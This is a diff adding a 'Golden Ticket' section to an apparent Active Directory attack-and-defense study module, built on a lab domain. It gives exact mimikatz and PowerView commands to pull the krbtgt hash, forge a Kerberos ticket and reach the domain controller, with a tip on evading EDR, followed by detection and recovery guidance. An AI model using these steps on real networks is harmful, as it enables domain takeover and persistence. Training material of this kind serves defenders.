@@ -40,8 +40,9 @@ This module covers **Active Directory attacks and defense** - common attack tech
 7. [Credentials in Shares](#7-credentials-in-shares)
 8. [Credentials in Object Properties](#8-credentials-in-object-properties)
 9. [DCSync](#9-dcsync)
-10. [Interview Questions](#10-interview-questions)
-11. [Additional Resources](#11-additional-resources)
+10. [Golden Ticket](#10-golden-ticket)
+11. [Interview Questions](#11-interview-questions)
+12. [Additional Resources](#12-additional-resources)
 
 ---
 
@@ -1273,7 +1274,196 @@ Supplemental Credentials:
 
 ---
 
-## 10. Interview Questions
+## 10. Golden Ticket
+
+### Description
+
+> 📌 **Golden Ticket** - forge Kerberos TGT using krbtgt account hash to gain Domain Admin access.
+
+```mermaid
+graph LR
+    Attacker[Attacker] -->|Has krbtgt<br/>hash| Forge[Forge TGT]
+    Forge -->|Create TGT for<br/>any user| TGT[Ticket Granting Ticket]
+    TGT -->|Valid for<br/>any service| Access[Full Domain Access]
+    
+    krbtgt[krbtgt account] -->|Password hash<br/>signs all tickets| Forge
+    
+    style Attacker fill:#ff9999,stroke:#333
+    style krbtgt fill:#ffcccc,stroke:#333
+    style TGT fill:#ffe5cc,stroke:#333
+    style Access fill:#ff9999,stroke:#333
+```
+
+**Key Points:**
+- Uses krbtgt password hash to sign forged TGTs
+- Can create tickets for any user (including non-existent)
+- Provides persistence after Domain Admin access
+- Can escalate from child to parent domain
+
+### Attack
+
+**Step 1: Get krbtgt hash via DCSync:**
+
+```cmd
+mimikatz.exe
+lsadump::dcsync /domain:eagle.local /user:krbtgt
+```
+
+**Output:**
+
+```
+Object RDN           : krbtgt
+SAM Username         : krbtgt
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: db0d0630064747072a7da3f7c3b4069e
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    aes256_hmac       (4096) : 1335dd3a999cacbae9164555c30f71c568fbaf9c3aa83c4563d25363523d1efc
+    aes128_hmac       (4096) : 8ca6bbd37b3bfb692a3cfaf68c579e64
+    des_cbc_md5       (4096) : 580229010b15b52f
+```
+
+<img width="667" height="771" alt="image" src="https://github.com/user-attachments/assets/b21f2133-fe24-45c5-904a-1d7683f28b96" />
+
+**Step 2: Get Domain SID:**
+
+```powershell
+. .\PowerView.ps1
+Get-DomainSID
+```
+
+**Output:**
+
+```
+S-1-5-21-1518138621-4282902758-752445584
+```
+
+<img width="744" height="209" alt="image" src="https://github.com/user-attachments/assets/37be9bfd-9dd0-474f-ac5e-ec5c198b9d5e" />
+
+**Step 3: Forge Golden Ticket:**
+
+```cmd
+mimikatz.exe
+
+kerberos::golden /domain:eagle.local /sid:S-1-5-21-1518138621-4282902758-752445584 /rc4:db0d0630064747072a7da3f7c3b4069e /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
+```
+
+**Output:**
+
+```
+User      : Administrator
+Domain    : eagle.local (EAGLE)
+SID       : S-1-5-21-1518138621-4282902758-752445584
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: db0d0630064747072a7da3f7c3b4069e - rc4_hmac_nt
+Lifestyle : 13/10/2022 06.28.43 ; 13/10/2022 06.36.43 ; 13/10/2022 06.35.43
+-> Ticket : ** Pass The Ticket **
+
+Golden ticket for 'Administrator @ eagle.local' successfully submitted for current session
+```
+
+<img width="1073" height="544" alt="image" src="https://github.com/user-attachments/assets/85ec5490-0fcc-4f85-a15e-211c85954aba" />
+
+**Step 4: Verify ticket:**
+
+```cmd
+klist
+```
+
+**Output:**
+
+```
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ eagle.local
+        Server: krbtgt/eagle.local @ eagle.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 10/13/2022 06.28.43
+        End Time:   10/13/2022 06.36.43
+        Renew Time: 10/13/2022 06.35.43
+```
+
+<img width="694" height="381" alt="image" src="https://github.com/user-attachments/assets/2775c1c5-9213-412d-9603-4dfb7fe658aa" />
+
+**Step 5: Access DC:**
+
+```cmd
+dir \\dc1\c$
+```
+
+**Output:**
+
+```
+ Directory of \\dc1\c$
+
+15/10/2022  08.30    <DIR>          DFSReports
+13/10/2022  13.23    <DIR>          Mimikatz
+01/09/2022  11.49    <DIR>          PerfLogs
+28/11/2022  01.59    <DIR>          Program Files
+01/09/2022  04.02    <DIR>          Program Files (x86)
+13/12/2022  02.22    <DIR>          scripts
+07/08/2022  11.31    <DIR>          Users
+28/11/2022  02.27    <DIR>          Windows
+```
+
+<img width="510" height="270" alt="image" src="https://github.com/user-attachments/assets/a1d2bf7e-3f3e-48d7-9e05-9477ebd693dd" />
+
+> 💡 Use `/renewmax` and `/endin` to avoid detection by EDR
+
+### Prevention
+
+| Mitigation | Description |
+|-----------|-------------|
+| **Reset krbtgt** | Periodically reset krbtgt password (use KrbtgtKeys.ps1) |
+| **PAW** | Privileged Access Workstations for admins |
+| **SID Filtering** | Enable between domains to prevent cross-domain escalation |
+| **Restrict Auth** | Block privileged users from authenticating to non-PAWs |
+
+> 🔴 Once attacker has krbtgt hash, they can forge any ticket!
+
+### Detection
+
+**Event IDs to monitor:**
+
+| Event ID | Description |
+|----------|-------------|
+| 4624 | Successful logon |
+| 4625 | Failed logon |
+| 4769 | TGS service ticket requested |
+| 4675 | SID filtering alert |
+
+**Detection Strategy:**
+- Baseline normal admin login locations/times
+- Alert on privileged users not from PAW
+- Monitor for TGS without prior TGT
+- Check for unusual service ticket requests
+
+**Event 4624 - Successful logon (looks normal):**
+
+<img width="1555" height="1346" alt="image" src="https://github.com/user-attachments/assets/d8550d3e-e4cd-458b-87bc-f1bb0b4d9374" />
+
+**Event 4769 - TGS requests (2 examples):**
+
+<img width="1511" height="857" alt="image" src="https://github.com/user-attachments/assets/b9028933-31f1-43f4-a9a7-e7bf110bbc0c" />
+
+<img width="1373" height="862" alt="image" src="https://github.com/user-attachments/assets/15b3aa7c-b3ba-4197-b6bd-c22891ee966e" />
+
+### Recovery After Compromise
+
+> ⚠️ If forest is compromised:
+> - Reset ALL user passwords
+> - Revoke all certificates
+> - Reset krbtgt password **TWICE** (with 10+ hours gap)
+> - Reset password history = 2 for krbtgt
+
+---
+
+## 11. Interview Questions
 
 ### Q1: What is Kerberoasting and how does it work?
 
@@ -1451,7 +1641,7 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} |
 
 ---
 
-## 11. Additional Resources
+## 12. Additional Resources
 
 ### Tools
 
